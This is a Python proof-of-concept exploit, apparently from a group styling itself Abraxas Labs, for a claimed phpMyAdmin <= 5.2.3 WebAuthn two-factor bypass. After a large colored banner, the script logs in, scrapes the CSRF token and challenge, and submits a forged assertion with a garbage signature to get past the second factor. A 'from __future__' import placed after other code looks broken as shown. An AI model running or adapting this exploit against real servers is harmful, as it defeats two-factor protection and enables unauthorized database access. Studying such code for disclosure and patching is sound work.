#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#
#  CVE: PMA-5.2.3-WebAuthn-2FA (High: 8.1)
#  Vendor: phpMyAdmin (phpMyAdmin)
#  Versions: phpMyAdmin <= 5.2.3
#  Impact: 2FA Bypass
#  Requires: authenticated POST /index.php?route=/
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.  Found in the wild.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "PMA-5.2.3-WebAuthn-2FA"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

from __future__ import annotations

import base64
import hashlib
import html as htmlmod
import json
import re
import sys
from urllib.parse import urlencode, urlparse

import urllib.error
import urllib.request
import http.cookiejar

WITNESS = "PMA-WEBAUTHN-BYPASS"
USER = "appuser"
PASSWORD = "apppass"
# 32 x 0xA1 — same as init.sql
CRED_RAW = bytes([0xA1]) * 32


def b64(data: bytes) -> str:
    return base64.b64encode(data).decode("ascii")


def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")


def sha256(data: bytes) -> bytes:
    return hashlib.sha256(data).digest()


def extract(name: str, html: str) -> str | None:
    m = re.search(
        r'name="%s"[^>]*value="([^"]*)"|value="([^"]*)"[^>]*name="%s"'
        % (re.escape(name), re.escape(name)),
        html,
        re.I,
    )
    if not m:
        return None
    return htmlmod.unescape(m.group(1) or m.group(2))


def extract_request_options(html: str) -> dict:
    m = re.search(
        r'data-request-options="([^"]+)"',
        html,
        re.I,
    )
    if not m:
        raise SystemExit("FAIL no data-request-options (not on WebAuthn 2FA page)")
    raw = htmlmod.unescape(m.group(1))
    return json.loads(raw)


class Client:
    def __init__(self, base: str) -> None:
        self.base = base.rstrip("/")
        self.jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar)
        )

    def get(self, path: str) -> str:
        req = urllib.request.Request(self.base + path, method="GET")
        with self.opener.open(req, timeout=30) as resp:
            return resp.read().decode("utf-8", "replace")

    def post(self, path: str, data: dict) -> tuple[int, str]:
        body = urlencode(data).encode()
        req = urllib.request.Request(
            self.base + path,
            data=body,
            method="POST",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )
        try:
            with self.opener.open(req, timeout=30) as resp:
                return resp.status, resp.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read().decode("utf-8", "replace")


def forge_assertion(challenge_std_b64: str, origin: str, host: str) -> str:
    """Build an assertion that satisfies CustomServer checks except the missing signature verify."""
    challenge_raw = base64.b64decode(challenge_std_b64)
    client_data = {
        "type": "webauthn.get",
        "challenge": b64url(challenge_raw),
        "origin": origin,
    }
    client_json = json.dumps(client_data, separators=(",", ":")).encode()
    rp_id_hash = sha256(host.encode("ascii"))
    flags = bytes([0x01])  # user-present
    sign_count = b"\x00\x00\x00\x01"
    auth_data = rp_id_hash + flags + sign_count
    garbage_sig = b"not-a-real-signature-" + WITNESS.encode()
    cred_id_url = b64url(CRED_RAW)
    cred_id_std = b64(CRED_RAW)
    return json.dumps(
        {
            "id": cred_id_url,
            "type": "public-key",
            "rawId": cred_id_std,
            "response": {
                "clientDataJSON": b64(client_json),
                "authenticatorData": b64(auth_data),
                "signature": b64(garbage_sig),
            },
        }
    )


def main() -> int:
    base = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:18080"
    parsed = urlparse(base)
    host = parsed.hostname or "127.0.0.1"
    origin = f"{parsed.scheme}://{parsed.netloc}"
    print(f"IOC target={base} origin={origin} host={host}")

    c = Client(base)
    login_html = c.get("/index.php?route=/")
    token = extract("token", login_html)
    set_session = extract("set_session", login_html)
    if not token:
        print("FAIL no CSRF token on login page")
        return 1

    fields = {
        "pma_username": USER,
        "pma_password": PASSWORD,
        "server": "1",
        "token": token,
        "set_session": set_session or "",
    }
    status, body = c.post("/index.php?route=/", fields)
    print(f"IOC password-login status={status} webauthn={'webauthn_request_response' in body}")

    if "webauthn_request_response" not in body:
        print("FAIL expected WebAuthn 2FA prompt after password")
        print(body[:800])
        return 1

    opts = extract_request_options(body)
    challenge = opts["challenge"]
    print(f"IOC challenge={challenge[:24]}…")

    assertion = forge_assertion(challenge, origin, host)
    token2 = extract("token", body) or token
    status2, body2 = c.post(
        "/index.php?route=/",
        {
            "server": "1",
            "token": token2,
            "webauthn_request_response": assertion,
        },
    )
    still_2fa = "webauthn_request_response" in body2
    landed = (
        "server-breadcrumb" in body2
        or 'id="page_content"' in body2
        or "route=/server/databases" in body2
        or "sql.php" in body2
        or "logged_in" in body2.lower()
    )
    print(f"IOC 2fa-post status={status2} still_2fa={still_2fa} landed={landed}")
    if still_2fa:
        err = re.search(r"alert-danger[^>]*>.*?>([^<]+)", body2)
        print("FAIL still on 2FA page", err.group(1) if err else body2[body2.find("card-text") : body2.find("card-text") + 400] if "card-text" in body2 else body2[:500])
        return 1
    if not landed:
        print("FAIL 2FA cleared but home UI not recognized")
        print(body2[:600])
        return 1
    print(f"SUCCESS {WITNESS} WebAuthn 2FA accepted with garbage signature")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

